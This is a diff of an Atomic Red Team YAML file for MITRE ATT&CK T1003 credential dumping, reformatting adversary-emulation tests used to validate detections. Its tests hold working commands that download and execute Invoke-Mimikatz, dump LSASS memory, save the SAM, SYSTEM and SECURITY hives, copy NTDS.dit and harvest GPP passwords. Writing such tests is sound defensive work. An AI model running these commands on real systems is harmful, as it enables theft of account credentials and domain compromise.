@@ -3,292 +3,292 @@ attack_technique: T1003
 display_name: Credential Dumping
 
 atomic_tests:
-- name: Powershell Mimikatz
-  description: |
-    Dumps Credentials via Powershell by invoking a remote mimikatz script
-  supported_platforms:
-    - windows
-  input_arguments:
-    remote_script:
-      description: URL to a remote Mimikatz script that dumps credentials
-      type: Url
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
-  executor:
-    name: powershell
-    elevation_required: true
-    command: |
-      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+  - name: Powershell Mimikatz
+    description: |
+      Dumps Credentials via Powershell by invoking a remote mimikatz script
+    supported_platforms:
+      - windows
+    input_arguments:
+      remote_script:
+        description: URL to a remote Mimikatz script that dumps credentials
+        type: Url
+        default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
-- name: Gsecdump
-  description: |
-    https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
-  supported_platforms:
-    - windows
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      gsecdump -a
+  - name: Gsecdump
+    description: |
+      https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        gsecdump -a
 
-- name: Windows Credential Editor
-  description: |
-    http://www.ampliasecurity.com/research/windows-credentials-editor/
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
-      type: Path
-      default: output.txt
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      wce -o #{output_file}
+  - name: Windows Credential Editor
+    description: |
+      http://www.ampliasecurity.com/research/windows-credentials-editor/
+    supported_platforms:
+      - windows
+    input_arguments:
+      output_file:
+        description: Path where resulting data should be placed
+        type: Path
+        default: output.txt
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        wce -o #{output_file}
 
-- name: Registry dump of SAM, creds, and secrets
-  description: |
-    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
-    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
-  supported_platforms:
-    - windows
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      reg save HKLM\sam sam
-      reg save HKLM\system system
-      reg save HKLM\security security
-    cleanup_command: |
-      rm sam
-      rm system
-      rm security
+  - name: Registry dump of SAM, creds, and secrets
+    description: |
+      Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
+      via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        reg save HKLM\sam sam
+        reg save HKLM\system system
+        reg save HKLM\security security
+      cleanup_command: |
+        rm sam
+        rm system
+        rm security
 
-- name: Dump LSASS.exe Memory using ProcDump
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
-    ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: lsass_dump.dmp
-  executor:
-    elevation_required: true
-    name: command_prompt
-    command: |
-      procdump.exe -accepteula -ma lsass.exe #{output_file}
+  - name: Dump LSASS.exe Memory using ProcDump
+    description: |
+      The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+      ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
+    supported_platforms:
+      - windows
+    input_arguments:
+      output_file:
+        description: Path where resulting dump should be placed
+        type: Path
+        default: lsass_dump.dmp
+    executor:
+      elevation_required: true
+      name: command_prompt
+      command: |
+        procdump.exe -accepteula -ma lsass.exe #{output_file}
 
-- name: Dump LSASS.exe Memory using Windows Task Manager
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
-    Manager and administrative permissions.
-  supported_platforms:
-    - windows
-  executor:
-    name: manual
-    steps: |
-      1. Open Task Manager:
-        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
-        on the task bar and selecting "Task Manager".
+  - name: Dump LSASS.exe Memory using Windows Task Manager
+    description: |
+      The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
+      Manager and administrative permissions.
+    supported_platforms:
+      - windows
+    executor:
+      name: manual
+      steps: |
+        1. Open Task Manager:
+          On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
+          on the task bar and selecting "Task Manager".
 
-      2. Select lsass.exe:
-        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
-        and select it for manipulation.
+        2. Select lsass.exe:
+          If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
+          and select it for manipulation.
 
-      3. Dump lsass.exe memory:
-        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
+        3. Dump lsass.exe memory:
+          Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
 
+  - name: Offline Credential Theft With Mimikatz
+    description: |
+      The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
+      Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
+    supported_platforms:
+      - windows
+    input_arguments:
+      input_file:
+        description: Path where resulting dump should be placed
+        type: Path
+        default: lsass_dump.dmp
+    executor:
+      name: manual
+      steps: |
+        1. Open Mimikatz:
+          Execute `mimikatz` at a command prompt.
 
-- name: Offline Credential Theft With Mimikatz
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
-    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
-  supported_platforms:
-    - windows
-  input_arguments:
-    input_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: lsass_dump.dmp
-  executor:
-    name: manual
-    steps: |
-      1. Open Mimikatz:
-        Execute `mimikatz` at a command prompt.
+        2. Select a Memory Dump:
+          Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
 
-      2. Select a Memory Dump:
-        Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
+        3. Obtain Credentials:
+          Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
 
-      3. Obtain Credentials:
-        Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
+  - name: Dump Active Directory Database with NTDSUtil
+    description: |
+      The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+      uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
+      subsequent domain controllers without the need of network-based replication.
+    supported_platforms:
+      - windows
+    input_arguments:
+      output_folder:
+        description: Path where resulting dump should be placed
+        type: Path
+        default: C:\Atomic_Red_Team
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
 
-- name: Dump Active Directory Database with NTDSUtil
-  description: |
-    The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
-    uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
-    subsequent domain controllers without the need of network-based replication.
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_folder:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: C:\Atomic_Red_Team
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+  - name: Create Volume Shadow Copy with NTDS.dit
+    description: |
+      The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+    supported_platforms:
+      - windows
+    input_arguments:
+      drive_letter:
+        description: Drive letter to source VSC (including colon)
+        type: String
+        default: "C:"
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        vssadmin.exe create shadow /for=#{drive_letter}
 
-- name: Create Volume Shadow Copy with NTDS.dit
-  description: |
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
-  supported_platforms:
-    - windows
-  input_arguments:
-    drive_letter:
-      description: Drive letter to source VSC (including colon)
-      type: String
-      default: "C:"
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      vssadmin.exe create shadow /for=#{drive_letter}
+  - name: Copy NTDS.dit from Volume Shadow Copy
+    description: |
+      The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
 
-- name: Copy NTDS.dit from Volume Shadow Copy
-  description: |
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+      A successful test also requires the export of the SYSTEM Registry hive. 
+      This test must be executed on a Windows Domain Controller.
+    supported_platforms:
+      - windows
 
-    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
-    A successful test also requires the export of the SYSTEM Registry hive. 
-    This test must be executed on a Windows Domain Controller.
-  supported_platforms:
-    - windows
+    input_arguments:
+      vsc_name:
+        description: Name of Volume Shadow Copy
+        type: String
+        default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+      extract_path:
+        description: Path for extracted NTDS.dit
+        type: Path
+        default: C:\Extract
 
-  input_arguments:
-    vsc_name:
-      description: Name of Volume Shadow Copy
-      type: String
-      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
-    extract_path:
-      description: Path for extracted NTDS.dit
-      type: Path
-      default: C:\Extract
+    dependencies:
+      - description: |
+          Target must be a Domain Controller
+        prereq_command: |
+          reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+        get_prereq_command: |
+          echo Sorry, Promoting this machine to a Domain Controller must be done manually
+      - description: |
+          Volume shadow copy must exist
+        prereq_command: |
+          if not exist #{vsc_name} (exit /b 1)
+        get_prereq_command: |
+          echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
+      - description: |
+          Extract path must exist
+        prereq_command: |
+          if not exist #{extract_path} (exit /b 1)
+        get_prereq_command: |
+          mkdir #{extract_path}
 
-  dependencies:
-    - description: |
-        Target must be a Domain Controller
-      prereq_command: |
-        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
-      get_prereq_command: |
-        echo Sorry, Promoting this machine to a Domain Controller must be done manually
-    - description: |
-        Volume shadow copy must exist
-      prereq_command: |
-        if not exist #{vsc_name} (exit /b 1)
-      get_prereq_command: |
-        echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
-    - description: |
-        Extract path must exist
-      prereq_command: |
-        if not exist #{extract_path} (exit /b 1)
-      get_prereq_command: |
-        mkdir #{extract_path}
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+        copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+        reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
 
-        
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
-      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
-      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+  - name: GPP Passwords (findstr)
+    description: |
+      Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
 
-- name: GPP Passwords (findstr)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+    supported_platforms:
+      - windows
 
-  supported_platforms:
-    - windows
+    executor:
+      name: command_prompt
+      elevation_required: false
+      command: |
+        findstr /S cpassword %logonserver%\sysvol\*.xml
 
-  executor:
-    name: command_prompt
-    elevation_required: false
-    command: |
-      findstr /S cpassword %logonserver%\sysvol\*.xml
+  - name: GPP Passwords (Get-GPPPassword)
+    description: |
+      Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
 
-- name: GPP Passwords (Get-GPPPassword)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+    supported_platforms:
+      - windows
 
-  supported_platforms:
-    - windows
+    input_arguments:
+      gpp_script_path:
+        description: Path to the Get-GPPPassword PowerShell Script
+        type: Path
+        default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+      gpp_script_url:
+        description: URL of the Get-GPPPassword PowerShell Script
+        type: URL
+        default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
 
-  input_arguments:
-    gpp_script_path:
-      description: Path to the Get-GPPPassword PowerShell Script
-      type: Path
-      default: PathToAtomicsFolder\T1003\src\some\some\Get-GPPPassword.ps1
-    gpp_script_url:
-      description: URL of the Get-GPPPassword PowerShell Script
-      type: URL
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+        prereq_command: |
+          if(Test-Path #{gpp_script_path}) { 0 } else { 1 }
+        get_prereq_command: |
+          $path = Split-Path #{gpp_script_path}
+          if(-not (Test-Path $path)){ New-Item -ItemType Directory -Path $path }
+          Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
 
-  dependency_executor_name: powershell 
-  dependencies: # (optional)
-    - description: |
-        Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
-      prereq_command: | 
-        if(Test-Path PathToAtomicsFolder\T1003\T1003\src\Get-GPPPassword.ps1) { 0 } else { 1 }
-      get_prereq_command: | 
-        Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        . #{gpp_script_path}
+        Get-GPPPassword -Verbose
 
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      . #{gpp_script_path}
-      Get-GPPPassword -Verbose
+  - name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
+    description: |
+      This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+      Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
 
-- name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
-  description: |
-    This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
-    Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+    supported_platforms:
+      - windows
 
-  supported_platforms:
-    - windows
+    input_arguments:
+      sam_binary_path:
+        description: Path of the SAM file
+        type: string
+        default: C:\Windows\System32\config\sam
+      system_binary_path:
+        description: Path of the SYSTEM file
+        type: string
+        default: C:\Windows\System32\config\system
+      security_binary_path:
+        description: Path of the SECURITY file
+        type: string
+        default: C:\Windows\System32\config\security
+      output_folder:
+        description: Output folder path
+        type: Path
+        default: C:\Windows\Temp
 
-  input_arguments:
-    sam_binary_path:
-      description: Path of the SAM file
-      type: string
-      default: C:\Windows\System32\config\sam
-    system_binary_path:
-      description: Path of the SYSTEM file
-      type: string
-      default: C:\Windows\System32\config\system
-    security_binary_path:
-      description: Path of the SECURITY file
-      type: string
-      default: C:\Windows\System32\config\security
-    output_folder:
-      description: Output folder path
-      type: Path
-      default: C:\Windows\Temp
-
-  executor:
-    name: powershell
-    elevation_required: true
-    command: |
-      . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
-      Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
-      Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
-      Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
-    cleanup_command: |
-      rm "#{output_folder}\sam"
-      rm "#{output_folder}\system"
-      rm "#{output_folder}\security"
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+        Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
+        Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
+        Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+      cleanup_command: |
+        rm "#{output_folder}\sam"
+        rm "#{output_folder}\system"
+        rm "#{output_folder}\security"
